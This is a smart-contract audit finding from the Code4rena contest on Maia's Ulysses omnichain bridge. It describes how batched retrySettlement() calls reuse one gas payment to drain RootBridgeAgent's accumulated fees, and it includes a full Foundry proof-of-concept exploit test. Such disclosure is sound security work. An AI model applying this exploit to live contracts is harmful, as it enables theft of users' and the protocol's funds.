## Tags

- bug
- 3 (High Risk)
- disagree with severity
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- H-11

# [Attacker can steal Accumulated Awards from RootBridgeAgent by abusing retrySettlement()](https://github.com/code-423n4/2023-05-maia-findings/issues/645) 

# Lines of code

https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L238-L272
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L1018-L1054
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L860-L1174
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L244-L252
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/VirtualAccount.sol#L41-L53
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L1177-L1216
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/MulticallRootRouter.sol#L345-L409


# Vulnerability details

## Impact

Accumulated Awards inside `RootBridgeAgent.sol` can be stolen. Accumulated Awards state will be compromised and awards will be stuck. 

### Note

End-to-end coded PoC is at the end of PoC section. 

## Proof of Concept

### Gas state

The gas related state inside `RootBridgeAgent` consists of 

`initialGas` - a checkpoint that records `gasleft()` at the start of `anyExecute` that has been called by Multichain when we have a cross-chain call. 

`userFeeInfo` - this is a struct that contains `depositedGas` which is the total amount of gas that the user has paid for on a BranchChain. The struct also contains `gasToBridgeOut` which is the amount of gas to be used for further cross-chain executions. The assumption is that `gasToBridgeOut < depositedGas` which is checked at the start of `anyExecute(...)` . 

At the end of `anyExecute(...)` - `_payExecutionGas()` is invoked that calculates the supplied gas available for execution on the Root `avaliableGas = _depositedGas - _gasToBridgeOut` and then a check is performed if `availableGas` is enough to cover `minExecCost` , (which uses the `initialGas` checkpoint and subtracts a second `gasleft()` checkpoint to represent the end of execution on the Root. The difference between `availableGas` and `minExecCost` is profit for the protocol and is recorded inside `accumulatedFees` state variable.  

```solidity
function _payExecutionGas(uint128 _depositedGas, uint128 _gasToBridgeOut, uint256 _initialGas, uint24 _fromChain)
        internal
    {
        //reset initial remote execution gas and remote execution fee information
        delete(initialGas);
        delete(userFeeInfo);

        if (_fromChain == localChainId) return;

        //Get Available Gas
        uint256 availableGas = _depositedGas - _gasToBridgeOut;

        //Get Root Environment Execution Cost
        uint256 minExecCost = tx.gasprice * (MIN_EXECUTION_OVERHEAD + _initialGas - gasleft());

        //Check if sufficient balance
        if (minExecCost > availableGas) {
            _forceRevert();
            return;
        }

        //Replenish Gas
        _replenishGas(minExecCost);

        //Account for excess gas
        accumulatedFees += availableGas - minExecCost;
    }
```

### Settlements

These are records of token’s that are “bridged out”(transferred) through the `RootBridgeAgent` to a `BranchBridgeAgent` . By default when a settlement is created it is Successful, unless execution on the Branch Chain fails and `anyFallback(...)` is called on the `RootBridgeAgent` which will set the settlement status as Failed. An example way to create a settlement will be to bridge out some assets from BranchBridgeAgent to RootBridgeAgent and embed extra data that represents another bridge operation from RootBridgeAgent to BranchBridgeAgent ( this flow passes through the `MulticallRootRouter` & could be the same branch agent as the first one or different) - at this point a settlement will be created. Moreover, a settlement could fail, for example, because of insufficient `gasToBridgeOut` provided by the user. In that case `anyFallback` is triggered on the RootBridgeAgent failing the settlement. At this time `retrySettlement()` becomes available to call for the particular settlement.

### The attack

Let’s first examine closely the `retrySettlement()` function. 

```solidity
function retrySettlement(uint32 _settlementNonce, uint128 _remoteExecutionGas) external payable {
        //Update User Gas available.
        if (initialGas == 0) {
            userFeeInfo.depositedGas = uint128(msg.value);
            userFeeInfo.gasToBridgeOut = _remoteExecutionGas;
        }
        //Clear Settlement with updated gas.
        _retrySettlement(_settlementNonce);
    }
```

If `initialGas == 0` it is assumed that someone directly calls `retrySettlement(...)` and therefore has to deposit gas (msg.value), however, if `initialGas > 0` it is assumed that `retrySettlement(...)` could be part of an `anyExecute(...)` call that contained instructions for the `MulticallRootRouter` to do the call through a `VirtualAccount` . Let’s assume the second scenario where `initialGas > 0` and examine the internal `_retrySettlement`. 

First we have the call to `_manageGasOut(...)` , where again if `initialGas > 0` we assume that the `retrySettlement(...)` is within an `anyExecute` , and therefore `userFeeInfo` state is already set. From there we perform a `_gasSwapOut(...)` with `userFeeInfo.gasToBridgeOut` where we swap `gasToBridgeOut` amount of `wrappedNative` for gas tokens that are burned. Then back in the internal `_retrySettlement(...)` the new gas is recorded in the settlement record and the message is sent to a Branch Chain via `anyCall`.

The weakness here is that after we retry a settlement with `userFeeInfo.gasToBridgeOut` we do not set `userFeeInfo.gasToBridgeOut = 0` , which if we perform only 1 `retrySettlement(...)` is not exploitable, however, if we embed in a single `anyExecute(...)` several `retrySettlement(...)`  calls it becomes obvious that we can pay 1 time for `gasToBridgeOut` on a Branch Chain and use it multiple times on the `RootChain` to fuel the many `retrySettlement(...)`.

The second feature that will be part of the attack is that on a Branch Chain we get refunded for the excess of `gasToBridgeOut` that wasn’t used for execution on the Branch Chain.   

```solidity
function _retrySettlement(uint32 _settlementNonce) internal returns (bool) {
        //Get Settlement
        Settlement memory settlement = getSettlement[_settlementNonce];

        //Check if Settlement hasn't been redeemed.
        if (settlement.owner == address(0)) return false;

        //abi encodePacked
        bytes memory newGas = abi.encodePacked(_manageGasOut(settlement.toChain));

        //overwrite last 16bytes of callData
        for (uint256 i = 0; i < newGas.length;) {
            settlement.callData[settlement.callData.length - 16 + i] = newGas[i];
            unchecked {
                ++i;
            }
        }

        Settlement storage settlementReference = getSettlement[_settlementNonce];

        //Update Gas To Bridge Out
        settlementReference.gasToBridgeOut = userFeeInfo.gasToBridgeOut;

        //Set Settlement Calldata to send to Branch Chain
        settlementReference.callData = settlement.callData;

        //Update Settlement Staus
        settlementReference.status = SettlementStatus.Success;

        //Retry call with additional gas
        _performCall(settlement.callData, settlement.toChain);

        //Retry Success
        return true;
    }
```

An attacker will trigger some number of `callOutAndBridge(...)` invocations from a Branch Chain with some assets and extra data that will call `callOutAndBridge(...)` on the Root Chain to transfer back these assets to the originating Branch Chain (or any other Branch Chain), however, the attacker will set minimum `depositedGas` to ensure execution on the Root Chain, but insufficient gas to complete remote execution on the Branch Chain, therefore, failing a number of settlements. The attacker will then follow with a `callOutAndBridge(...)` from a Branch Chain that contains extra data for the `MutlicallRouter` for the `VirtualAccount` to call `retrySettlement(...)` for every Failed settlement. Since we will have multiple `retrySettlement(...)` invocations inside a single `anyExecute` at some point the `gasToBridgeOut` sent to each settlement will become `>` the deposited gas and we will be spending from the Root Branch reserves (accumulated rewards). The attacker will redeem his profit on the Branch Chain, since he gets a gas refund there, and there will also be a mismatch between `accumulatedRewards` and the native currency in `RootBridgeAgent` , therefore, `sweep()` will revert and any `accumulatedRewards` that are left will be bricked. 

### Coded PoC

Copy the two functions `testGasIssue` & `_prepareDeposit` in `test/ulysses-omnichain/RootTest.t.sol` and place them in the `RootTest` contract after the setup. 

Execute with `forge test --match-test testGasIssue -vv` 

Result - attacker starts with 1000000000000000000 wei (1 ether) and has 1169999892307980000 wei (>1 ether) after execution of attack (the end number could be slightly different, depending on foundry version). Mismatch between `accumulatedRewards` and the amount of WETH in the contract. 

Note - there are console logs added from the developers in some of the mock contracts, consider commenting them out for clarity of the output.

```solidity
function testGasIssue() public {
        testAddLocalTokenArbitrum();
        console2.log("---------------------------------------------------------");
        console2.log("-------------------- GAS ISSUE START---------------------");
        console2.log("---------------------------------------------------------");
        // Accumulate rewards in RootBridgeAgent
        address some_user = address(0xAAEE);
        hevm.deal(some_user, 1.5 ether);
        // Not a valid flag, MulticallRouter will return false, that's fine, we just want to credit some fees
        bytes memory empty_params = abi.encode(bytes1(0x00));
        hevm.prank(some_user);
        avaxMulticallBridgeAgent.callOut{value: 1.1 ether }(empty_params, 0);

        // Get the global(root) address for the avax H mock token
        address globalAddress = rootPort.getGlobalTokenFromLocal(avaxMockAssethToken, avaxChainId);

        // Attacker starts with 1 ether
        address attacker = address(0xEEAA);
        hevm.deal(attacker, 1 ether);
        
        // Mint 1 ether of the avax mock underlying token
        hevm.prank(address(avaxPort));
        
        MockERC20(address(avaxMockAssetToken)).mint(attacker, 1 ether);
        
        // Attacker aproves the underlying token
        hevm.prank(attacker);
        MockERC20(address(avaxMockAssetToken)).approve(address(avaxPort), 1 ether);

        
        // Print out the amounts of WrappedNative & AccumulateAwards state 
        console2.log("RootBridge WrappedNative START",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));
        console2.log("RootBridge ACCUMULATED FEES START", multicallBridgeAgent.accumulatedFees());

        // Attacker's underlying avax mock token balance
        console2.log("Attacker underlying token balance avax", avaxMockAssetToken.balanceOf(attacker));

        // Prepare a single deposit with remote gas that will cause the remote exec from the root to branch to fail
        // We will have to mock this fail since we don't have the MultiChain contracts, but the provided 
        // Mock Anycall has anticipated for that

        DepositInput memory deposit = _prepareDeposit();
        uint128 remoteExecutionGas = 2_000_000_000;

        Multicall2.Call[] memory calls = new Multicall2.Call[](0);

        OutputParams memory outputParams = OutputParams(attacker, globalAddress, 500, 500);
        
        bytes memory params = abi.encodePacked(bytes1(0x02),abi.encode(calls, outputParams, avaxChainId));

        console2.log("ATTACKER ETHER BALANCE START", attacker.balance);

        // Toggle anyCall for 1 call (Bridge -> Root), this config won't do the 2nd anyCall
        // Root -> Bridge (this is how we mock BridgeAgent reverting due to insufficient remote gas)
        MockAnycall(localAnyCallAddress).toggleFallback(1);

        // execute
        hevm.prank(attacker);
        // in reality we need 0.00000002 (supply a bit more to make sure we don't fail execution on the root)
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.00000005 ether }(params, deposit, remoteExecutionGas);

        // Switch to normal mode 
        MockAnycall(localAnyCallAddress).toggleFallback(0);
        // this will call anyFallback() on the Root and Fail the settlement
        MockAnycall(localAnyCallAddress).testFallback();

        // Repeat for 1 more settlement
        MockAnycall(localAnyCallAddress).toggleFallback(1);
        hevm.prank(attacker);
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.00000005 ether}(params, deposit, remoteExecutionGas);
        
        MockAnycall(localAnyCallAddress).toggleFallback(0);
        MockAnycall(localAnyCallAddress).testFallback();
        
        // Print out the amounts of WrappedNative & AccumulateAwards state  after failing the settlements but before the attack 
        console2.log("RootBridge WrappedNative AFTER SETTLEMENTS FAILUER BUT BEFORE ATTACK",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));
        console2.log("RootBridge ACCUMULATED FEES AFTER SETTLEMENTS FAILUER BUT BEFORE ATTACK", multicallBridgeAgent.accumulatedFees());

        // Encode 2 calls to retrySettlement(), we can use 0 remoteGas arg since 
        // initialGas > 0 because we execute the calls as a part of an anyExecute()
        Multicall2.Call[] memory malicious_calls = new Multicall2.Call[](2);

        bytes4 selector = bytes4(keccak256("retrySettlement(uint32,uint128)"));

        malicious_calls[0] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,1,0)});
        malicious_calls[1] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,2,0)});
        // malicious_calls[2] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,3,0)});
        
        outputParams = OutputParams(attacker, globalAddress, 500, 500);
        
        params = abi.encodePacked(bytes1(0x02),abi.encode(malicious_calls, outputParams, avaxChainId));

        // At this point root now has ~1.1 
        hevm.prank(attacker);
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.1 ether}(params, deposit, 0.09 ether);
        
        // get attacker's virtual account address
        address vaccount = address(rootPort.getUserAccount(attacker));

        console2.log("ATTACKER underlying balance avax", avaxMockAssetToken.balanceOf(attacker));
        console2.log("ATTACKER global avax h token balance root", ERC20hTokenRoot(globalAddress).balanceOf(vaccount));

        console2.log("ATTACKER ETHER BALANCE END", attacker.balance);
        console2.log("RootBridge WrappedNative END",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));
        console2.log("RootBridge ACCUMULATED FEES END", multicallBridgeAgent.accumulatedFees());
        console2.log("---------------------------------------------------------");
        console2.log("-------------------- GAS ISSUE END ----------------------");
        console2.log("---------------------------------------------------------");

    }

    function _prepareDeposit() internal returns(DepositInput memory) {
        // hToken address
        address addr1 = avaxMockAssethToken;

        // underlying address
        address addr2 = address(avaxMockAssetToken);

        uint256 amount1 = 500;
        uint256 amount2 = 500;

        uint24 toChain = rootChainId;

        return DepositInput({
            hToken:addr1,
            token:addr2,
            amount:amount1,
            deposit:amount2,
            toChain:toChain
        });

    }
```

## Tools used

Manual inspection

## Reccomendation

It is hard to conclude a particular fix but consider setting `userFeeInfo.gasToBridgeOut = 0` after `retrySettlement`  as part of the mitigation.


## Assessed type

Context